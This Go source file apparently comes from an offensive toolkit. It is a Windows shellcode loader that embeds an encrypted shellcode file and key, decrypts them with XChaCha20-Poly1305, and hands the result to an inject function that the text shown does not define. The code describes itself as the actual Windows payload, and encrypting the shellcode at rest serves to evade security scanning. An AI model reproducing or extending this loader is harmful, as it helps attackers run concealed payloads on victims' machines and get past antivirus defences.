//go:build windows

package main

import (
	_ "embed"

	"golang.org/x/crypto/chacha20poly1305"
)

// Encrypted binary for shellcode to run (use linux command to generate file)
//
//go:embed shell.bin
var shellcode []byte

//go:embed shell.key
var key []byte

// Main function for handling the actual windows payload
func main() {
	decrypted, err := decryptShellcode(shellcode, key)
	if err != nil {
		panic(err)
	}

	inject(decrypted)
}

func decryptShellcode(buf []byte, key []byte) (plaintext []byte, err error) {
	aead, err := chacha20poly1305.NewX(key)
	if err != nil {
		return nil, err
	}

	if len(buf) < aead.NonceSize() {
		panic("ciphertext too short")
	}

	// Split nonce and ciphertext.
	nonce, ciphertext := buf[:aead.NonceSize()], buf[aead.NonceSize():]

	// Decrypt the message and check it wasn't tampered with.
	plaintext, err = aead.Open(nil, nonce, ciphertext, nil)
	if err != nil {
		return nil, err
	}

	return plaintext, nil
}
